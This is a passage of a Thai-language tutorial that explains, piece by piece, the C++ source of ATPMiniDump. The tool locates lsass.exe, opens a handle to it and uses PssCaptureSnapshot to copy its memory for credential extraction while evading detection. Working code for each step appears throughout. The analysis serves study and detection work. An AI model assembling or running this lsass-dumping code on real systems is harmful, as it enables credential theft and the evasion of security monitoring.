<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_WIN_VER_INFO</span> {
	WCHAR chOSMajorMinor[<span style="color:#ae81ff">8</span>];
	DWORD dwBuildNumber;
	UNICODE_STRING ProcName;
	HANDLE hTargetPID;
	LPCSTR lpApiCall;
	INT SystemCall;
} WIN_VER_INFO, <span style="color:#f92672">*</span>PWIN_VER_INFO;
</code></pre></div><p>จากบทเรียนของเราในเรื่อง typedef (ข้ามไปอ่าน <a href="#loading-external-function-with-function-pointer">Loading External Function with Function Pointer</a> ได้เพื่อความเข้าใจที่มากขึ้น) เราสามารถอธิบายการโค้ดด้านบนได้ดังนี้</p>
<ul>
<li>ทำการสร้างประเภทของข้อมูลใหม่ในชื่อ <code>_WIN_VER_INFO</code> จากประเภทข้อมูลแบบ <code>struct</code></li>
<li>ประเภทข้อมูลนี้จะมีโครงสร้างภายในคือ
<ul>
<li>เก็บค่า <code>chOSMajorMinor</code> แบบ wide character ขนาดอาเรย์ 8 ช่อง</li>
<li>เก็บค่า <code>dwBuildNumber</code> แบบ double word</li>
<li>เก็บค่า <code>ProcName</code> แบบสตริงที่ใช้ Unicode encoding</li>
<li>เก็บค่า <code>hTargetPID</code> ในลักษณะของ handle</li>
<li>เก็บค่า <code>lpApiCall</code> แบบพอยน์เตอร์แบบ 32 บิตซึ่งชี้ไปยังสตริงแบบ constant</li>
<li>เก็บค่า <code>SystemCall</code> แบบจำนวนเต็ม</li>
</ul>
</li>
<li>ชื่อของตัวแปรแบบ struct คือ <code>WIN_VER_INFO</code></li>
<li>ชื่อของพอยน์เตอร์ซึ่งชี้มายัง struct นี้คือ <code>*PWIN_VER_INFO</code></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">PWIN_VER_INFO pWinVerInfo <span style="color:#f92672">=</span> (PWIN_VER_INFO)calloc(<span style="color:#ae81ff">1</span>, <span style="color:#66d9ef">sizeof</span>(WIN_VER_INFO));
</code></pre></div><p>เนื่องจากข้อมูลประเภท <code>PWIN_VER_INFO</code> นั้นเป็น pointer ซึ่งชี้ไปยังตำแหน่งในหน่วยความจำที่จะมีการโครงสร้างตามที่ระบุเอาไว้ การสร้างตัวแปร <code>pWinVerInfo</code> จึงมีการระบุตำแหน่งของพื้นที่หน่วยความจำซึ่งจองเอาไว้ผ่านการเรียกใช้ฟังก์ชัน <code>calloc</code> ซึ่งถูกเรียกใช้เพื่อจองพื้นที่ในหน่วยความจำแบบอาเรย์ที่มีขนาดตามขนาดของ <code>PWIN_VER_INFO</code></p>
<p>หลังจากเสร็จสิ้นการสร้างตัวแปร <code>pWinVerInfo</code> โค้ดในส่วนถัดมายังมีการสร้างและกำหนดขนาดของตัวแปรอีกตัวหนึ่งคือ <code>osInfo</code> เป็นประเภท <code>OSVERSIONINFOEX</code> ซึ่งเป็นประเภทของข้อมูลที่ถูกระบุเอาไว้อยู่แล้วในไฟล์ <code>Windows.h</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">OSVERSIONINFOEXW osInfo;
osInfo.dwOSVersionInfoSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(osInfo);
</code></pre></div><p>อ้างอิงจากไมโครซอฟต์ โครงสร้าง <code>OSVERSIONINFOEXW</code> เป็นโครงสร้างซึ่งเอามาไว้สำหรับเก็บข้อมูลซึ่งเกี่ยวข้องกับระบบปฏิบัติการ ลักษณะของโครงสร้างสามารถดูได้จากลักษณะของโครงสร้างด้านล่าง</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_OSVERSIONINFOEXW</span> {
  DWORD dwOSVersionInfoSize;
  DWORD dwMajorVersion;
  DWORD dwMinorVersion;
  DWORD dwBuildNumber;
  DWORD dwPlatformId;
  WCHAR szCSDVersion[<span style="color:#ae81ff">128</span>];
  WORD  wServicePackMajor;
  WORD  wServicePackMinor;
  WORD  wSuiteMask;
  BYTE  wProductType;
  BYTE  wReserved;
} OSVERSIONINFOEXW, <span style="color:#f92672">*</span>POSVERSIONINFOEXW, <span style="color:#f92672">*</span>LPOSVERSIONINFOEXW, RTL_OSVERSIONINFOEXW, <span style="color:#f92672">*</span>PRTL_OSVERSIONINFOEXW;
</code></pre></div><p>จากโครงสร้างของ <code>OSVERSIONINFOEXW</code> และการกำหนดค่าให้ด้วยโค้ด <code>osInfo.dwOSVersionInfoSize</code> ให้มีขนาดตามตัวแปร <code>osInfo</code> เป็นการบ่งชี้ว่าตัวแปร <code>osInfo</code> มีการถูกตั้งค่าเพื่อที่จะถูกใช้ในส่วนต่อไปในฟังก์ชันนี้</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">_RtlGetVersion RtlGetVersion <span style="color:#f92672">=</span> (_RtlGetVersion)GetProcAddress(GetModuleHandle(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;ntdll.dll&#34;</span>), <span style="color:#e6db74">&#34;RtlGetVersion&#34;</span>);
<span style="color:#66d9ef">if</span> (RtlGetVersion <span style="color:#f92672">==</span> NULL) {
  <span style="color:#66d9ef">return</span> FALSE;
}

wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;[1] Checking OS version details:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
RtlGetVersion(<span style="color:#f92672">&amp;</span>osInfo);
</code></pre></div><p>โค้ดด้านบนแสดงให้เห็นการใช้ตัวแปร <code>osInfo</code> ซึ่งถูกสร้างขึ้นมาก่อนหน้า และก็ยังแสดงให้เห็นความพยายามในการใช้ตัวแปรและข้อมูลในตัวแปร <code>osInfo</code> เพื่อตรวจสอบรุ่นของระบบปฏิบัติการก่อนที่โปรแกรมจะทำงาน โดยข้อมูลในตัวแปร <code>osInfo</code> นั้นมีที่มาจากการเรียกใช้ฟังก์ชัน <code>RtlGetVersion()</code> จาก <code>ntdll.dll</code> ซึ่งถูกนำเข้ามาประกอบร่างด้วย function pointer เมื่อเสร็จสิ้นการทำงาน ฟังก์ชัน <code>RtlGetVersion()</code> จะทำการเก็บข้อมูลตามที่ระบุไว้ในโครงสร้าง <code>OSVERSIONINFOEXW</code> ที่ตำแหน่งของตัวแปร <code>osInfo</code></p>
<p>โค้ดในส่วนถัดมาด้านบนคือส่วนของโค้ดซึ่งใช้ตรวจสอบระบบและรุ่นของระบบปฏิบัติการว่ารองรับการทำงานตามเงื่อนไขของโปรแกรมหรือไม่ เนื่องจากระบบและรุ่นของระบบปฏิบัติการหากนับตาม <a href="https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions">Release version</a> จะมีรูปแบบ อาทิ Windows 10 และ Windows Server ในรุ่นที่ถูกปล่อยออกมาพร้อมกับ Windows 10 จะมี Release version คือ 10.0 ส่วน Windows 8.1 และ Windows Server ในรุ่นที่ปล่อยออกมาพร้อมกับ Windows 8.1 จะมี Release version คือ 6.3 โดยข้อมูลที่อยู่หน้าจุดจะเรียกว่า Major version และข้อมูลซึ่งอยู่หลังจุดจะถูกเรียกว่า Minor version ฟังก์ชัน <code>wmain()</code> จึงมีการนำค่าทั้งสองส่วนนี้มาประกอบร่างให้สามารถเกิดรูปแบบของ X.X ตามที่ควรจะเป็น</p>
<p>เนื่องจากข้อมูลของระบบของเราอยู่ในตัวแปร <code>osInfo</code> และในโครงสร้าง <code>OSVERSIONEXW</code> นั้นค่า Major version สามารถหาได้จาก <code>osInfo.dwMajorVersion</code> และค่า Minor version สามารถหาได้จาก <code>osInfo.dwMinorVersion</code> การประกอบร่างที่เราพูดถึงกันอยู่นี้จึงเป็นการนำค่าในสองส่วนนี้มาเชื่อมกันโดยมีเครื่องหมายจุดคั่นกลาง สำหรับโค้ดในฟังก์ชัน <code>wmain()</code> นั้น กระบวนการนี้เกิดขึ้นได้ด้วยการเรียกใช้ฟังก์ชัน <code>swprintf_s()</code></p>
<p>ฟังก์ชัน <code>swprintf_s()</code> เป็นฟังก์ชันซึ่งจะทำการคัดลอกข้อมูลที่ต้องการ ทำการจัดรูปแบบและลักษณะ ก่อนจะนำไปเก็บไว้ที่ตำแหน่งปลายที่เราระบุ ซึ่งสามารถอธิบายได้ตามรายละเอียดด้านล่าง</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">swprintf_s(
  pWinVerInfo<span style="color:#f92672">-&gt;</span>chOSMajorMinor,
  _countof(pWinVerInfo<span style="color:#f92672">-&gt;</span>chOSMajorMinor), 
  <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;%u.%u&#34;</span>, 
  osInfo.dwMajorVersion, 
  osInfo.dwMinorVersion
);
pWinVerInfo<span style="color:#f92672">-&gt;</span>dwBuildNumber <span style="color:#f92672">=</span> osInfo.dwBuildNumber;
</code></pre></div><ul>
<li><code>pWinVerInfo-&gt;chOSMajorMinor</code> คือตำแหน่งปลายที่ข้อมูลจะถูกคัดลอกและจัดรูปแบบไปเก็บเอาไว้</li>
<li><code>_countof(pWinVerInfo-&gt;chOSMajorMinor)</code> คือจำนวนตัวอักษรซึ่งจะจัดเก็บ</li>
<li><code>L&quot;%u.%u&quot;</code> คือลักษณะของ format string ที่จะทำการมาใช้เป็นแม่แบบในการปรับเปลี่ยนลักษณะของข้อมูลก่อนจะทำการจัดเก็บ ในที่นี้คือการเก็บแบบ unsigned int โดยที่มีเครื่องหมายจุดคั่นกลาง</li>
<li><code>osInfo.dwMajorVersion</code> และ <code>osInfo.dwMinorVersion</code> คือลำดับของอากิวเมนต์ที่จะถูกคัดลอกและเอาไปใส่ไว้ใน <code>pWinVerInfo-&gt;chOSMajorMinor</code> ด้วยรูปแบบ <code>L&quot;%u.%u&quot;</code></li>
</ul>
<p>หลังจากกระบวนการคัดลอก จัดรูปแบบและเอาไปใส่ไว้ที่หน่วยความจำปลายทางด้วยฟังก์ชัน <code>swprintf_s()</code> แล้ว โค้ดยังมีการกำหนดค่าใน <code>pWinVerInfo.dwBuildNumber</code> ให้เป็นค่าตาม <code>osInfo.dwBuildNumber</code> ด้วย</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">if</span> (_wcsicmp(pWinVerInfo<span style="color:#f92672">-&gt;</span>chOSMajorMinor, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;10.0&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
		lpOSVersion <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;10 or Server 2016&#34;</span>;
		wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;	[+] Operating System is Windows %ls, build number %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpOSVersion, pWinVerInfo<span style="color:#f92672">-&gt;</span>dwBuildNumber);
}
<span style="color:#66d9ef">else</span> <span style="color:#a6e22e">if</span> (_wcsicmp(pWinVerInfo<span style="color:#f92672">-&gt;</span>chOSMajorMinor, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;6.3&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
  lpOSVersion <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;8.1 or Server 2012 R2&#34;</span>;
  wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;	[+] Operating System is Windows %ls, build number %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpOSVersion, pWinVerInfo<span style="color:#f92672">-&gt;</span>dwBuildNumber);
}
<span style="color:#66d9ef">else</span> {
  wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;	[!] OS Version not supported.</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
  exit(<span style="color:#ae81ff">1</span>);
}
</code></pre></div><p>เมื่อมีการเตรียมข้อมูลเรียบร้อยแล้ว โค้ดจะเริ่มทำการเปรียบเทียบค่าตามเงื่อนไขเพื่อให้ทำงานต่อไปได้หากมีการทำงานอยู่บนรุ่นระบบปฏิบัติการที่รองรับ และหยุดการทำงานหากมันกำลังทำงานอยู่ในรุ่นของระบบปฏิบัติการที่ไม่รองรับ เราสามารถทำความเข้าใจคร่าวๆ ตามโค้ดด้านบนได้ว่าค่าซึ่งถูกสร้างจากฟังก์ชัน <code>swprintf_s</code> คือ <code>pWinVerInfo.chOSMajorMiner</code> กำลังถูกนำมาเปรียบเทียบกับ constant value ด้วยฟังก์ชัน <code>_wcsicmp()</code> โดยหากรุ่นของระบบปฏิบัติการไม่ได้มี Release version เป็น 6.3 หรือ 10.0 โปรแกรมจะหยุดการทำงาน</p>
<p>หากสภาพแวดล้อมของระบบสอดคล้องกับเงื่อนไขการทำงานของโปรแกรม โปรแกรมจะทำงานต่อในโค้ดส่วนถัดไปและถือเสร็จสิ้นการทำงานในขั้นตอนที่ 2 หรือขั้นตอนของการตรวจสอบรุ่นของระบบปฏิบัติการ และเข้าสู่ขั้นตอนที่ 3 หรือขั้นตอนของการเริ่มเข้าถึงข้อมูลในหน่วยความจำของโปรเซสเพื่อระบุหาข้อมูลสำหรับยืนยันตัวตน</p>
<p>ในขั้นตอนที่ 3 กรบวนการทำงานเริ่มต้นที่การสร้าง function pointer ของฟังก์ชัน <code>RtlInitUnicodeString()</code> จาก <code>ntdll.dll</code> โดยหน้าที่หลักของฟังก์ชันนี้คือการเปลี่ยนค่าสตริงให้กลายเป็นสตริงแบบ Unicode ฟังก์ชันนี้ทำการเปลี่ยนค่าซึ่งอยู่ในสตริง <code>lpwProcName</code> ให้มาเก็บในตำแหน่งของ <code>pWinVerInfo.ProcName</code> ในลักษณะของ Unicode</p>
<p>ค่าของตัวแปร <code>lpwProcName</code> ถูกกำหนดไว้ในบรรทัด 155 ว่ามีค่าคือ <code>lsass.exe</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">_RtlInitUnicodeString RtlInitUnicodeString <span style="color:#f92672">=</span> (_RtlInitUnicodeString) GetProcAddress(GetModuleHandle(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;ntdll.dll&#34;</span>), <span style="color:#e6db74">&#34;RtlInitUnicodeString&#34;</span>);
<span style="color:#66d9ef">if</span> (RtlInitUnicodeString <span style="color:#f92672">==</span> NULL) {
  <span style="color:#66d9ef">return</span> FALSE;
}

RtlInitUnicodeString(<span style="color:#f92672">&amp;</span>pWinVerInfo<span style="color:#f92672">-&gt;</span>ProcName, lpwProcName);

<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GetPID(pWinVerInfo)) {
  wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;	[!] Enumerating process failed.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  exit(<span style="color:#ae81ff">1</span>);
}

wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;	[+] Process ID of %wZ is: %lld</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pWinVerInfo<span style="color:#f92672">-&gt;</span>ProcName, (ULONG64)pWinVerInfo<span style="color:#f92672">-&gt;</span>hTargetPID);
</code></pre></div><p>หลังจากนั้นฟังก์ชัน <code>GetPID()</code> ถูกเรียกใช้งานโดยมีการระบุตัวแปร <code>pWinVerInfo</code> เอาไว้เป็นข้อมูลนำเข้า หากใครได้อ่าน<a href="#getpid-function">การอธิบายฟังก์ชัน <code>GetPID()</code></a> มาแล้วจะเข้าใจได้ทันทีว่าฟังก์ชัน <code>GetPID()</code> จะมีการนำค่า <code>pWinVerInfo.ProcName</code> ไปหา process ID ก่อนจะนำผลลัพธ์ที่ได้ไปเก็บไว้ใน <code>pWinVerInfo.hTargetPID</code></p>
<p>เมื่อทราบเป้าหมายแล้วว่าโปรเซส <code>lsass.exe</code> มีการทำงานอยู่และมี process ID ใด ฟังก์ชัน <code>wmain()</code> จะเริ่มทำการสร้างการเข้าถึงหน่วยความจำในโปรเซส <code>lsass.exe</code> ทันทีตามตัวอย่างโค้ดด้านล่าง</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;	[+] Open a process handle.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
HANDLE hProcess <span style="color:#f92672">=</span> NULL;
OBJECT_ATTRIBUTES ObjectAttributes;
InitializeObjectAttributes(<span style="color:#f92672">&amp;</span>ObjectAttributes, NULL, <span style="color:#ae81ff">0</span>, NULL, NULL);
</code></pre></div><p>มีการสร้างตัวแปรใหม่ขึ้นมาในส่วนแรก 2 รายการ ได้แก่ <code>hProcess</code> ประเภท <code>HANDLE</code> ซึ่งทำให้เราสามารถเดาได้คร่าวๆ ว่าเมื่อตัวแปรนี้ถูกนำมาใช้งาน มันจะเก็บ process handle ของโปรเซสใด โปรเซสหนึ่งเอาไว้</p>
<p>ตัวแปร <code>ObjectAttributes</code> เป็นอีกตัวแปรที่ถุกสร้างขึ้นมาพร้อมๆ กับ <code>hProcess</code> โดย <code>ObjectAttributes</code> เป็นตัวแปรประเภท <code>OBJECT_ATTRIBUTES</code> สำหรับการกำหนดคุณลักษณะของออบเจ็กต์ ตัวแปร <code>ObjectAttributes</code> ยังมีการถูก initialize เอาไว้ด้วยฟังก์ชัน <code>InitializeObjectAttributes()</code> ซึ่งทำให้คาดเดาได้ว่าตัวแปร <code>ObjectAttributes</code> อาจถูกใช้ในอนาคต ลักษณะของพารามิเตอรที่ระบุให้กับฟังก์ชัน <code>InitializeObjectAttributes()</code> ยังไม่มีลักษณะพิเศษใดๆ เป็นเพียงการ initialize แบบว่างเปล่าเอาไว้เท่านั้น</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">CLIENT_ID uPid <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
uPid.UniqueProcess <span style="color:#f92672">=</span> pWinVerInfo<span style="color:#f92672">-&gt;</span>hTargetPID;
uPid.UniqueThread <span style="color:#f92672">=</span> (HANDLE)<span style="color:#ae81ff">0</span>;

ULONG rights <span style="color:#f92672">=</span> (PROCESS_CREATE_PROCESS <span style="color:#f92672">|</span> PROCESS_CREATE_THREAD <span style="color:#f92672">|</span> PROCESS_QUERY_LIMITED_INFORMATION <span style="color:#f92672">|</span> PROCESS_DUP_HANDLE <span style="color:#f92672">|</span> PROCESS_QUERY_INFORMATION);
printf(<span style="color:#e6db74">&#34;Access rights %x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, rights);
</code></pre></div><p>ต่อมามีการสร้างตัวแปรใหม่เพิ่มขึ้นมาอีก 2 รายการ ได้แก่ <code>uPid</code> เป็นประเภท <code>CLIENT_ID</code> ที่ถูกระบุเอาไว้ใน<a href="https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.h#L67">ไฟล์ <code>ATPMiniDump.h</code> บรรทัดที่ 67</a> หลังจากถูกสร้างขึ้น ตัวแปร <code>uPid</code> มีการถูกกำหนดค่าทันทีตามโครงสร้างของประเภท <code>CLIENT_ID</code> โดยค่า <code>uPid.UniqueProcess</code> ถูกกำหนดให้เป็นค่า process ID ของ <code>lsass.exe</code> ตามที่เก็บเอาไว้ใน <code>pWinVerInfo.hTargetPID</code> และค่า <code>uPid.UniqueThread</code> ถูกกำหนดให้เป็นค่า 0 ในประเภท <code>HANDLE</code></p>
<p>ตัวแปรที่สองคือ <code>rights</code> โดยมีการกำหนดค่าตาม access rights ของโปรเซสที่ระบุไว้ใน<a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights">เอกสารของไมโครซอฟต์</a> เราคาดว่าค่าในตัวแปร <code>rights</code> จะถูกนำมาใช้อีกครั้งเพื่อระบุสิทธิ์ที่เราจะขอเข้าถึงโปรเซส</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">_ZwOpenProcess ZwOpenProcess <span style="color:#f92672">=</span> (_ZwOpenProcess) GetProcAddress(GetModuleHandle(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;ntdll.dll&#34;</span>), <span style="color:#e6db74">&#34;ZwOpenProcess&#34;</span>);
<span style="color:#66d9ef">if</span> (ZwOpenProcess <span style="color:#f92672">==</span> NULL) {
  <span style="color:#66d9ef">return</span> FALSE;
}
	
NTSTATUS status <span style="color:#f92672">=</span> ZwOpenProcess(
  <span style="color:#f92672">&amp;</span>hProcess, <span style="color:#75715e">// ProcessHandle
</span><span style="color:#75715e"></span>  rights, <span style="color:#75715e">// DesiredAccess
</span><span style="color:#75715e"></span>  <span style="color:#f92672">&amp;</span>ObjectAttributes, <span style="color:#75715e">// ObjectAttributes
</span><span style="color:#75715e"></span>  <span style="color:#f92672">&amp;</span>uPid <span style="color:#75715e">// ClientId
</span><span style="color:#75715e"></span>);
printf(<span style="color:#e6db74">&#34;ZwOpenProcess Handle %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, hProcess);
<span style="color:#66d9ef">if</span> (hProcess <span style="color:#f92672">==</span> NULL) {
  wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;	[!] Failed to get processhandle.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  exit(<span style="color:#ae81ff">1</span>);
}
</code></pre></div><p>โค้ดส่วนต่อมาคือการสร้าง function pointer ของฟังก์ชัน <code>ZwOpenProcess()</code> และการเรียกใช้ฟังก์ชัน <code>ZwOpenProcess()</code> เราจะเห็นได้จากพารามิเตอร์ของฟังก์ชัน <code>ZwOpenProcess()</code> ว่าตัวแปรซึ่งถูกสร้างและกำหนดค่ามาก่อนหน้านั้นถูกใช้อย่างไร ในกรณีที่การทำงานของฟังก์ชัน <code>ZwOpenProcess()</code> เสร็จสิ้น ตัวแปร <code>hProcess</code> จะเก็บ process handle สำหรับโปรเซส <code>lsass.exe</code> ซึ่งสามารถนำไปใช้ต่อได้จนกว่า process handle ดังกล่าวจะถูกทำลายทิ้ง</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">HANDLE snapshotHandle;

DWORD flags <span style="color:#f92672">=</span> (DWORD)PSS_CAPTURE_VA_CLONE
  <span style="color:#f92672">|</span> PSS_CAPTURE_HANDLES
  <span style="color:#f92672">|</span> PSS_CAPTURE_HANDLE_NAME_INFORMATION
  <span style="color:#f92672">|</span> PSS_CAPTURE_HANDLE_BASIC_INFORMATION
  <span style="color:#f92672">|</span> PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
  <span style="color:#f92672">|</span> PSS_CAPTURE_HANDLE_TRACE
  <span style="color:#f92672">|</span> PSS_CAPTURE_THREADS
  <span style="color:#f92672">|</span> PSS_CAPTURE_THREAD_CONTEXT
  <span style="color:#f92672">|</span> PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
  <span style="color:#f92672">|</span> PSS_CREATE_BREAKAWAY
  <span style="color:#f92672">|</span> PSS_CREATE_BREAKAWAY_OPTIONAL
  <span style="color:#f92672">|</span> PSS_CREATE_USE_VM_ALLOCATIONS
  <span style="color:#f92672">|</span> PSS_CREATE_RELEASE_SECTION;

DWORD hr <span style="color:#f92672">=</span> PssCaptureSnapshot(
  hProcess, <span style="color:#75715e">// ProcessHandle
</span><span style="color:#75715e"></span>  flags, <span style="color:#75715e">// CaptureFlags
</span><span style="color:#75715e"></span>  CONTEXT_ALL, <span style="color:#75715e">// ThreadContextFlags
</span><span style="color:#75715e"></span>  <span style="color:#f92672">&amp;</span>snapshotHandle <span style="color:#75715e">// *SnapshotHandle
</span><span style="color:#75715e"></span>  );
printf(<span style="color:#e6db74">&#34;Snapshot Handle %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, hr);
</code></pre></div><p>โค้ดในส่วนต่อซึ่งแสดงให้เห็นด้านบนคือส่วนที่ถูกพัฒนาเพิ่มเติมเข้ามาเพื่อให้มีการใช้ฟังก์ชัน <code>PssCaptureSnapshot()</code> ในการช่วยข้ามผ่านและหลบหลีกการตรวจจับเพื่อการเข้าถึงข้อมูลสำหรับยืนยันตัวตนในหน่วยความจำ โค้ดส่วนแรกแสดงให้เห็นการสร้างตัวแปรใหม่ประเภท <code>HANDLE</code> ชื่อ <code>snapshotHandle</code> จากนั้นเราจะเห็นการสร้างอีกตัวแปรหนึ่งคือ <code>flags</code> ในประเภท <code>DWORD</code> ซึ่งจะทำการเก็บ flag สำหรับฟังก์ชัน <code>PssCaptureSnapshot()</code> เอาไว้ เราสามารถทำความเข้าใจค่า flag แล้วนี้ได้เสมือนกับมันเป็นตัวเลือกในการใช้งานฟังก์ชัน <code>PssCaptureSnapshot()</code></p>
<p>เราสามารถทำความเข้าใจความหมายของแต่ละ flag ซึ่งถูกระบุอยู่ในตัวแปร <code>flags</code> ได้จาก<a href="https://docs.microsoft.com/en-us/windows/win32/api/processsnapshot/ne-processsnapshot-pss_capture_flags">เอกสารของไมโครซอฟต์</a></p>
<p>ตัวแปรใหม่เหล่านี้ที่ถูกสร้างมาก่อนหน้ากำลังจะถูกใช้ในโค้ดบรรทัดต่อมา ฟังก์ชัน <code>PssCaptureSnapshot()</code> มีการถูกเรียกใช้และมีการกำหนดให้ตัวแปร <code>hr</code> ประเภท <code>DWORD</code> นั้นคอยรับค่าที่ฟังก์ชัน <code>PssCaptureSnapshot()</code> จะส่งออกมาหลังจากทำงานจนเสร็จ พารามิเตอร์ที่มีการใช้ในฟังก์ชัน <code>PssCaptureSnapshot()</code> สามารถอธิบายได้ดังนี้</p>
<ul>
<li>พารามิเตอร์ <code>ProcessHandle</code> ซึ่งในที่นี้คือ <code>hProcess</code> ถูกระบุเป็น process handle สำหรับโปรเซสเป้าหมายที่เราต้องการจะใช้ฟังก์ชัน <code>PssCaptureSnapshot()</code> ในการสร้าง snapshot</li>
<li>พารามิเตอร์ <code>CaptureFlags</code> ซึ่งในที่นี้คือ <code>flags</code> เป็นตัวเลือกหรือออปชันสำหรับการเรียกใช้ฟังก์ชัน <code>PssCaptureSnapshot()</code> โดยการเลือกตั้งค่า <code>flags</code> ก็จะส่งผลให้มีการสร้าง snapshot ด้วยข้อมูลที่ต่างออกไป อาทิ หากกำหนดให้มี <code>PSS_CAPTURE_HANDLES</code> ฟังก์ชัน <code>PssCaptureSnapshot()</code> ก็จะทำการเก็บรายการของ handle ของโปรเซสดังกล่าวด้วย</li>
<li>พารามิเตอร์ <code>ThreadContextFlags</code> ซึ่งในที่นี้คือ <code>CONTEXT_ALL</code> เป็น flag ซึ่งจะใช้ระบุ flag สำหรับ thread ในกรณีที่ <code>flags</code> มีการกำหนดเกี่ยวข้องกับการทำงานในระดับ thread</li>
<li>พารามิเตอร์ <code>*SnapshotHandle</code> ซึ่งในที่นี้คือ <code>&amp;snapshotHandle</code> เป็น handle สำหรับ snapshot ซึ่งฟังก์ชันนี้จะดำเนินการบันทึก</li>
</ul>
<p>ในสถานการณ์ที่ <code>hProcess</code> เป็น handle ของ <code>lsass.exe</code> เราคาดหวังว่าหลังจาก <code>PssCaptureSnapshot</code> ทำงานจนเสร็จแล้ว เราจะสามารถเข้าถึง snapshot ได้ที่ตำแหน่งของ <code>snapshotHandle</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
ZeroMemory(<span style="color:#f92672">&amp;</span>CallbackInfo, <span style="color:#66d9ef">sizeof</span>(MINIDUMP_CALLBACK_INFORMATION));
CallbackInfo.CallbackRoutine <span style="color:#f92672">=</span> ATPMiniDumpWriteDumpCallback;
CallbackInfo.CallbackParam <span style="color:#f92672">=</span> NULL;
</code></pre></div><p>ต่อมาตัวแปร <code>CallbackInfo</code> ที่มีประเภทข้อมูลคือ <code>MINIDUMP_CALLBACK_INFORMATION</code> โดยพื้นที่ในหน่วยความจำของตัวแปร <code>CallbackInfo</code> ถูกเขียนทับด้วยค่าศูนย์ผ่านฟังก์ชัน <code>ZeroMemory</code> ให้มีขนาดเท่ากับขนาดของข้อมูลประเภท <code>MINIDUMP_CALLBACK_INFORMATION</code></p>
<p>โครงสร้างของประเภทข้อมูล <code>MINIDUMP_CALLBACK_INFORMATION</code> ได้ถูกระบุไว้แล้วใน <code>DbgHelp.h</code> ซึ่งมีโครงสร้างตามรายละเอียดด้านล่าง</p>
